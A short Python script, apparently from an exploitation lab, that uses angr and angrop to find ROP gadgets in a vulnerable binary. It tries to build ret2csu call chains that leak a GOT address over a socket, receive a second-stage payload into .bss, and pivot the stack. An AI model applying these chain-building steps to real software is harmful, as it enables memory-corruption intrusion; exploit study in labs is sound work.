import logging, angr, angrop
logging.getLogger("angrop").setLevel(logging.ERROR); logging.getLogger("angr").setLevel(logging.CRITICAL)
B="bins/vuln_client3"
FD=3; GOT=0x403e10; BSS=0x404000; N=8

p=angr.Project(B, auto_load_libs=False)
print("csu @", hex(p.loader.main_object.get_symbol("__libc_csu_init").rebased_addr))
rop=p.analyses.ROP(fast_mode=False, only_check_near_rets=False)
rop.find_gadgets_single_threaded(show_progress=False)
print("gadgets:", len(rop.rop_gadgets))

def attempt(desc, fn):
    try:
        r=fn(); print("  %-48s -> BUILT (%d gadgets)"%(desc, len(r._gadgets)))
    except Exception as e:
        print("  %-48s -> RAISED: %s"%(desc, e))

print("\n[lab3 needs: send(leak) RETURNS -> recv(stage2) RETURNS -> pivot]")
print("-- returning ret2csu calls (what the leak+stage flow requires) --")
attempt("net_send(fd,got,8) needs_return=True", lambda: rop.func_call("net_send",[FD,GOT,N],needs_return=True))
attempt("send(fd,got,8)     needs_return=True", lambda: rop.func_call("send",[FD,GOT,N],needs_return=True))
attempt("net_recv(fd,bss,n) needs_return=True", lambda: rop.func_call("net_recv",[FD,BSS,0x100],needs_return=True))

print("-- chaining two calls (leak THEN stage2 in one chain) --")
attempt("net_send(...) + net_recv(...)", lambda: rop.func_call("net_send",[FD,GOT,N]) + rop.func_call("net_recv",[FD,BSS,0x100]))

print("-- what angrop CAN do: a single terminal (fire-and-forget) call --")
attempt("net_send(...) default (fire-and-forget)", lambda: rop.func_call("net_send",[FD,GOT,N]))
